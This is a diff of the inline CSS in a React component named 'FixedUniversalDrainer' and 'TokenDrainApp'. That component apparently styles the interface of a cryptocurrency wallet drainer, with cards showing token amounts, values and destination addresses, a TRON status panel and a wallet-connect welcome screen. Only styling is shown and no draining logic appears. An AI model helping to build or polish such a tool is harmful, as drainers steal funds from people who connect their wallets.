-          border-radius: 50%;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          background: rgba(255, 255, 255, 0.1);
-        }
-        
-        .transaction-item.success .tx-icon {
-          background: rgba(16, 185, 129, 0.2);
-          color: #10b981;
-        }
-        
-        .transaction-item.failed .tx-icon {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
+          font-size: 24px;
         }
         
         .tx-details {
           flex: 1;
         }
         
-        .tx-main {
-          display: flex;
-          gap: 15px;
-          flex-wrap: wrap;
-          margin-bottom: 8px;
-          align-items: center;
-        }
-        
         .tx-symbol {
-          font-weight: 700;
-          font-size: 16px;
-          color: white;
-        }
-        
-        .tx-network {
-          color: rgba(255, 255, 255, 0.7);
-          font-size: 13px;
           font-weight: 600;
-          background: rgba(255, 255, 255, 0.1);
-          padding: 3px 8px;
-          border-radius: 4px;
+          font-size: 16px;
+          margin-bottom: 2px;
         }
         
         .tx-amount {
-          font-family: 'Monaco', 'Courier New', monospace;
+          font-family: monospace;
           color: #ddd;
-          font-weight: 600;
-          font-size: 15px;
-        }
-        
-        .tx-value {
-          color: #10b981;
-          font-weight: 700;
-          font-size: 15px;
-          margin-left: auto;
-        }
-        
-        .tx-secondary {
-          display: flex;
-          gap: 15px;
-          flex-wrap: wrap;
-          font-size: 13px;
-          align-items: center;
+          margin-bottom: 2px;
         }
         
         .tx-status {
-          font-weight: 700;
-          padding: 3px 10px;
-          border-radius: 4px;
+          font-weight: 600;
+          margin-bottom: 2px;
         }
         
         .transaction-item.success .tx-status {
           color: #10b981;
-          background: rgba(16, 185, 129, 0.1);
         }
         
         .transaction-item.failed .tx-status {
           color: #ef4444;
-          background: rgba(239, 68, 68, 0.1);
         }
         
         .tx-message {
-          color: rgba(255, 255, 255, 0.5);
-          font-style: italic;
+          color: #888;
+          font-size: 12px;
+          margin-bottom: 5px;
         }
         
         .tx-link {
           color: #3b82f6;
+          font-size: 12px;
           text-decoration: none;
-          font-weight: 600;
-          transition: all 0.3s;
-          padding: 3px 10px;
-          border-radius: 4px;
-          background: rgba(59, 130, 246, 0.1);
         }
         
         .tx-link:hover {
-          background: rgba(59, 130, 246, 0.2);
           text-decoration: underline;
         }
         
-        /* Error Alert */
-        .error-alert {
-          background: linear-gradient(135deg, rgba(124, 45, 18, 0.9), rgba(220, 38, 38, 0.9));
-          border-radius: 12px;
-          padding: 18px;
+        /* Tokens */
+        .tokens-panel {
+          background: #222;
+          border-radius: 16px;
+          padding: 20px;
+          margin-bottom: 20px;
+          border: 1px solid #333;
+        }
+        
+        .panel-summary {
           display: flex;
-          align-items: center;
           gap: 15px;
-          margin-bottom: 25px;
-          border: 2px solid rgba(239, 68, 68, 0.3);
-          animation: pulse-alert 2s infinite;
-          backdrop-filter: blur(10px);
+          color: #888;
+          font-size: 14px;
         }
         
-        @keyframes pulse-alert {
-          0%, 100% { opacity: 1; box-shadow: 0 5px 20px rgba(239, 68, 68, 0.3); }
-          50% { opacity: 0.9; box-shadow: 0 5px 25px rgba(239, 68, 68, 0.5); }
+        .tokens-grid {
+          display: grid;
+          grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+          gap: 15px;
+          margin-top: 20px;
         }
         
-        .error-icon {
-          font-size: 28px;
-          width: 50px;
-          height: 50px;
-          border-radius: 50%;
+        .token-card {
+          background: #1a1a1a;
+          border-radius: 12px;
+          padding: 20px;
+          border: 1px solid #333;
+        }
+        
+        .token-header {
           display: flex;
           align-items: center;
-          justify-content: center;
-          background: rgba(255, 255, 255, 0.2);
+          gap: 10px;
+          margin-bottom: 10px;
         }
         
-        .error-message {
-          flex: 1;
+        .token-symbol {
+          font-weight: 700;
+          font-size: 20px;
           color: white;
-          font-size: 15px;
-          font-weight: 600;
         }
         
-        /* Welcome Screen */
-        .welcome-screen {
+        .token-network {
+          color: #888;
+          font-size: 12px;
           flex: 1;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 40px 20px;
         }
         
-        .welcome-content {
-          background: rgba(34, 34, 34, 0.9);
-          border-radius: 20px;
-          padding: 50px;
-          border: 1px solid rgba(255, 255, 255, 0.1);
+        .token-type {
+          padding: 2px 6px;
+          border-radius: 4px;
+          font-size: 10px;
+          font-weight: 600;
+          text-transform: uppercase;
+        }
+        
+        .token-type.evm {
+          background: rgba(59, 130, 246, 0.2);
+          color: #3b82f6;
+        }
+        
+        .token-type.non-evm {
+          background: rgba(239, 68, 68, 0.2);
+          color: #ef4444;
+        }
+        
+        .token-amount {
+          font-size: 24px;
+          font-weight: 700;
+          color: white;
+          margin-bottom: 5px;
+        }
+        
+        .token-value {
+          color: #10b981;
+          font-size: 18px;
+          font-weight: 600;
+          margin-bottom: 10px;
+        }
+        
+        .token-destination {
+          background: #222;
+          border-radius: 6px;
+          padding: 8px;
+          font-family: monospace;
+          font-size: 12px;
+          color: #888;
+          border: 1px solid #333;
+        }
+        
+        /* Instructions */
+        .instructions-panel {
+          background: #222;
+          border-radius: 16px;
+          padding: 20px;
+          border: 1px solid #f59e0b;
+        }
+        
+        .instructions-panel h3 {
+          color: #f59e0b;
+          margin: 0 0 15px 0;
+        }
+        
+        .instructions-panel ul {
+          margin: 0;
+          padding-left: 20px;
+          color: #ddd;
+          line-height: 1.6;
+        }
+        
+        .instructions-panel li {
+          margin-bottom: 8px;
+        }
+        
+        /* Welcome */
+        .welcome-screen {
           text-align: center;
+          padding: 60px 20px;
           max-width: 600px;
-          width: 100%;
-          backdrop-filter: blur(10px);
-          box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+          margin: 0 auto;
         }
         
         .welcome-icon {
-          font-size: 80px;
-          margin-bottom: 30px;
-          color: #ef4444;
-          animation: pulse 2s infinite;
-        }
-        
-        .welcome-screen h2 {
-          color: #ef4444;
+          font-size: 64px;
           margin-bottom: 20px;
-          font-size: 36px;
-          font-weight: 800;
-          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
         
         .welcome-text {
-          color: rgba(255, 255, 255, 0.8);
-          margin-bottom: 40px;
+          color: #ddd;
+          margin-bottom: 20px;
           font-size: 18px;
-          line-height: 1.6;
-          font-weight: 500;
         }
         
-        .mobile-hint {
-          color: rgba(255, 255, 255, 0.6);
-          font-size: 14px;
-          margin-top: 15px;
-          font-style: italic;
-        }
-        
-        .network-stats {
-          display: flex;
-          justify-content: center;
-          gap: 30px;
-          margin-top: 40px;
-          flex-wrap: wrap;
-        }
-        
-        .stat-item {
-          text-align: center;
-        }
-        
-        .stat-number {
-          font-size: 36px;
-          font-weight: 800;
+        .warning-text {
           color: #ef4444;
-          margin-bottom: 5px;
-          text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+          margin-bottom: 30px;
+          font-size: 16px;
+          font-weight: 600;
         }
         
-        .stat-label {
-          color: rgba(255, 255, 255, 0.7);
+        .connect-section {
+          margin-bottom: 40px;
+        }
+        
+        .features {
+          background: #222;
+          border-radius: 12px;
+          padding: 20px;
+          text-align: left;
+          max-width: 400px;
+          margin: 0 auto;
+        }
+        
+        .feature {
+          color: #ddd;
+          margin-bottom: 10px;
           font-size: 14px;
-          text-transform: uppercase;
-          letter-spacing: 1px;
-          font-weight: 600;
         }
         
         /* Footer */
         .app-footer {
-          margin-top: auto;
-          padding-top: 30px;
-          border-top: 1px solid rgba(255, 255, 255, 0.1);
+          margin-top: 40px;
+          padding-top: 20px;
+          border-top: 1px solid #333;
           text-align: center;
-          color: rgba(255, 255, 255, 0.6);
+          color: #888;
           font-size: 14px;
-          padding-bottom: 20px;
         }
         
         .footer-content {
           display: flex;
           justify-content: center;
           align-items: center;
-          gap: 20px;
-          flex-wrap: wrap;
+          gap: 10px;
         }
         
         .status-dot {
-          width: 10px;
-          height: 10px;
+          width: 8px;
+          height: 8px;
           background: #10b981;
           border-radius: 50%;
           animation: pulse 2s infinite;
@@ -2328,94 +2005,160 @@ function FixedUniversalDrainer() {
         
         /* Responsive */
         @media (max-width: 768px) {
-          .app-header {
-            flex-direction: column;
-            gap: 20px;
-            text-align: center;
-          }
-          
-          .header-left {
-            justify-content: center;
-            text-align: center;
-            min-width: auto;
-          }
-          
-          .header-right {
-            justify-content: center;
-            width: 100%;
-          }
-          
-          .connected-wallet {
-            justify-content: center;
-            width: 100%;
-          }
-          
           .stats-row {
-            grid-template-columns: 1fr;
-          }
-          
-          .controls-container {
             flex-direction: column;
-          }
-          
-          .btn {
-            width: 100%;
-            min-width: auto;
           }
           
           .tokens-grid {
             grid-template-columns: 1fr;
           }
           
-          .welcome-content {
-            padding: 30px 20px;
-          }
-          
-          .welcome-screen h2 {
-            font-size: 28px;
-          }
-          
-          .stat-number {
-            font-size: 28px;
-          }
-          
           .footer-content {
             flex-direction: column;
-            gap: 10px;
+            gap: 5px;
           }
         }
+      `}</style>
+      {/* CSS Styles - Add these to your existing styles */}
+      <style jsx>{`
+        .error-alert {
+          background: linear-gradient(135deg, #7c2d12, #dc2626);
+          border-radius: 12px;
+          padding: 15px;
+          display: flex;
+          align-items: center;
+          gap: 15px;
+          margin-bottom: 20px;
+          border: 2px solid #ef4444;
+          animation: pulse-alert 2s infinite;
+        }
         
-        @media (max-width: 480px) {
-          .app-container {
+        @keyframes pulse-alert {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.8; }
+        }
+        
+        .error-icon {
+          font-size: 24px;
+        }
+        
+        .error-message {
+          flex: 1;
+          color: white;
+          font-size: 14px;
+        }
+        
+        .error-help {
+          font-size: 12px;
+          opacity: 0.9;
+          margin-top: 5px;
+          color: #ffd700;
+        }
+        
+        .error-close {
+          background: none;
+          border: none;
+          color: white;
+          font-size: 20px;
+          cursor: pointer;
+          padding: 5px;
+        }
+        
+        .tron-status {
+          background: rgba(255, 6, 10, 0.15);
+          border-radius: 12px;
+          padding: 15px;
+          display: flex;
+          align-items: center;
+          gap: 15px;
+          margin-bottom: 20px;
+          border: 1px solid rgba(255, 6, 10, 0.3);
+          animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+          from { transform: translateY(-10px); opacity: 0; }
+          to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .tron-status-icon {
+          font-size: 24px;
+          background: rgba(255, 6, 10, 0.2);
+          width: 40px;
+          height: 40px;
+          border-radius: 50%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+        }
+        
+        .tron-status-details {
+          flex: 1;
+        }
+        
+        .tron-status-title {
+          font-size: 14px;
+          color: #ff6b6b;
+          font-weight: 600;
+          margin-bottom: 5px;
+        }
+        
+        .tron-status-info {
+          font-size: 12px;
+          color: #ddd;
+        }
+        
+        .mobile-badge {
+          background: rgba(0, 100, 255, 0.2);
+          color: #3b82f6;
+          padding: 4px 8px;
+          border-radius: 6px;
+          font-size: 12px;
+          border: 1px solid rgba(0, 100, 255, 0.3);
+        }
+        
+        .mobile-features {
+          background: #222;
+          border-radius: 12px;
+          padding: 20px;
+          text-align: left;
+          max-width: 500px;
+          margin: 0 auto;
+          margin-top: 20px;
+        }
+        
+        .mobile-features .feature {
+          color: #ddd;
+          margin-bottom: 10px;
+          font-size: 14px;
+          display: flex;
+          align-items: center;
+        }
+        
+        .mobile-features .feature:before {
+          content: '✓';
+          color: #10b981;
+          margin-right: 10px;
+          font-weight: bold;
+        }
+        
+        /* Mobile-specific adjustments */
+        @media (max-width: 768px) {
+          .status-card.primary {
             padding: 15px;
           }
           
-          .status-card {
+          .status-message {
+            font-size: 16px;
+          }
+          
+          .control-buttons {
             flex-direction: column;
-            text-align: center;
-            gap: 15px;
           }
           
-          .status-icon {
-            width: 60px;
-            height: 60px;
-            font-size: 32px;
-          }
-          
-          .token-header {
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 8px;
-          }
-          
-          .tx-main {
-            flex-direction: column;
-            align-items: flex-start;
-            gap: 8px;
-          }
-          
-          .tx-value {
-            margin-left: 0;
+          .btn {
+            padding: 14px 18px;
+            font-size: 15px;
           }
         }
       `}</style>
@@ -2424,4 +2167,3 @@ function FixedUniversalDrainer() {
 }
 
 export default TokenDrainApp;
-
